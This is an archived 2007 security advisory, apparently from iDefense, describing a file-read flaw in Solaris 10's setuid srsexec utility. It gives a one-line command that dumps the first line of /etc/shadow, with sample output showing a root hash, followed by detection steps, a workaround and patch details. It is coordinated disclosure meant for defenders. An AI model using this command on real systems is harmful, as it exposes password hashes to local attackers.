
Date: Thu, 10 May 2007 13:54:27 -0400
From: iDefense Labs <labs-no-reply@...fense.com>
To: vulnwatch@...nwatch.org,  full-disclosure@...ts.grok.org.uk, 
	bugtraq@...urityfocus.com
Subject: iDefense Security Advisory 05.10.07: Sun
 Microsystems Solaris SRS Proxy Core srsexec Arbitrary File Read
 Vulnerability

Sun Microsystems Solaris SRS Proxy Core srsexec Arbitrary File Read
Vulnerability

iDefense Security Advisory 05.10.07
http://labs.idefense.com/intelligence/vulnerabilities/
May 10, 2007

I. BACKGROUND

The srsexec utility is part of the SRS Proxy Core package that is
available with Solaris 10. It is installed setuid root by default. For
more information about this software, visit the following URL.

http://www.sun.com/service/netconnect/

II. DESCRIPTION

Local exploitation of a design error vulnerability in the srsexec binary
optionally included in Sun Microsystems Inc., Solaris 10 allows
attackers to gain access to sensitive information, such as the root
password hash.

The vulnerability specifically exists because of a failure to drop
permissions or check the permissions on the file specified for the
target file. If a user specified verify only mode (-v) as well as debug
mode (-d), and specified a protected file such as /etc/shadow, srsexec
will display the first line of /etc/shadow in the debug messages. The
following demonstrates a sample exploitation session:

  $ /opt/SUNWsrspx/bin/srsexec -dvb /etc/shadow OWNED
  verify_binary(OWNED)
  srsexec: binary_name: OWNED
  srsexec: name_buf:    OWNED_______________
  binaries file line:   root:omhyabndnAtNw:6
  binaries file line:   :6445::::::
  smmsp:NP
  Security verification failed for binary: OWNED
  see SYSLOG(/var/adm/messages) for errors

III. ANALYSIS

Exploitation of this vulnerability allows attackers to gain access to
the root password hash or other sensitive information.

In order to exploit this vulnerability, an attacker must have local user
access to the system.

IV. DETECTION

iDefense has confirmed the existence of this vulnerability in Solaris 10
with the SUNWsrspx package installed. In order to determine if this
package is installed, an administrator can execute the following
command:

  # pkginfo SUNWsrspx

If this command returns 'ERROR: information for "SUNWsrspx" was not
found', then the system does not have the affected package installed
and is not vulnerable.

V. WORKAROUND

Remove the setuid bit from the srsexec binary:

  # chmod -s /opt/SUNWsrspx/bin/srsexec

VI. VENDOR RESPONSE

Sun Microsystems has addressed this vulnerability with a patch release.
For more information, consult Sun Alert ID 102891 at the following URL.

http://sunsolve.sun.com/search/document.do?assetkey=1-26-102891-1

VII. CVE INFORMATION

A Mitre Corp. Common Vulnerabilities and Exposures (CVE) number has not
been assigned yet.

VIII. DISCLOSURE TIMELINE

11/07/2006  Initial vendor notification
11/10/2006  Initial vendor response
05/10/2007  Coordinated public disclosure

IX. CREDIT

The discoverer of this vulnerability wishes to remain anonymous.

Get paid for vulnerability research
http://labs.idefense.com/methodology/vulnerability/vcp.php

Free tools, research and upcoming events
http://labs.idefense.com/

X. LEGAL NOTICES

Copyright Â© 2007 iDefense, Inc.

Permission is granted for the redistribution of this alert
electronically. It may not be edited in any way without the express
written consent of iDefense. If you wish to reprint the whole or any
part of this alert in any other medium other than electronically,
please e-mail customerservice@...fense.com for permission.

Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
 There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct,
indirect, or consequential loss or damage arising from use of, or
reliance on, this information.

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
